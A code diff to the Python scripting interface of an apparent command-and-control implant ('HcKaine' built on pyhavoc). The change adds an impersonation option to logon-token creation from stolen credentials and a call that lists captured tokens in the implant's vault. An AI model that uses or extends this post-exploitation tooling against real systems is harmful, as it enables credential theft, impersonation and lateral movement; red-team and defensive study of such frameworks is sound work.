@@ -1152,20 +1152,21 @@ class HcKaine( pyhavoc.agent.HcAgent ):
         username      : str,
         password      : str,
         local_token   : bool = True,
+        impersonate   : bool = True,
         vault_save    : bool = True,
         wait_to_finish: bool = True
-    ) -> int:
+    ) -> tuple[int, str, int]:
         """
         generate token from valid credentials
 
         :param domain:
-            domain name
+            logon domain name
 
         :param username:
-            user name
+            logon username
 
         :param password:
-            password
+            logon password
 
         :param local_token:
             if local token should be generated to access other users directories
@@ -1203,6 +1204,7 @@ class HcKaine( pyhavoc.agent.HcAgent ):
                 "username"    : username,
                 "password"    : password,
                 "local-token" : local_token,
+                "impersonate" : impersonate,
                 "vault-save"  : vault_save
             }
         }, wait_to_finish )
@@ -1219,20 +1221,44 @@ class HcKaine( pyhavoc.agent.HcAgent ):
 
         return ctx[ 'handle' ], ctx[ 'uid' ], task
 
-    def token_vault(
+    def token_vault_list(
         self,
-        action        : str,
-        token_handle  : int  = 0,
         wait_to_finish: bool = True
-    ) -> str:
-        return self.agent_execute( {
+    ) -> tuple[int, list[dict], int]:
+        """
+        get all captured and saved tokens inside the vault
+
+        :param wait_to_finish:
+            should wait for returned data (default: true)
+
+        :return:
+            returning a tuple -> (current-token, tokens, task-uuid)
+
+            current-token:
+                is the current impersonated token from the vault
+
+            tokens:
+                captured and saved tokens inside the vault
+
+            task-uuid:
+                uuid task
+        """
+
+        ctx = self.agent_execute( {
             "command":   "IoTokenControl",
             "arguments": {
-                "control" : "vault",
-                "action"  : action,
-                "token"   : token_handle
+                "control" : "vault-list",
             }
         }, wait_to_finish )
+
+        if 'error' in ctx:
+            raise Exception( ctx[ 'error' ] )
+
+        if 'status' in ctx:
+            if ctx[ 'status' ] != 'STATUS_SUCCESS':
+                raise Exception( ctx[ 'status' ] )
+
+        return ctx[ 'current-token' ], ctx[ 'return' ], ctx[ 'task-uuid' ]
 
 @pyhavoc.agent.HcAgentExport
 class HcKaineCommand:
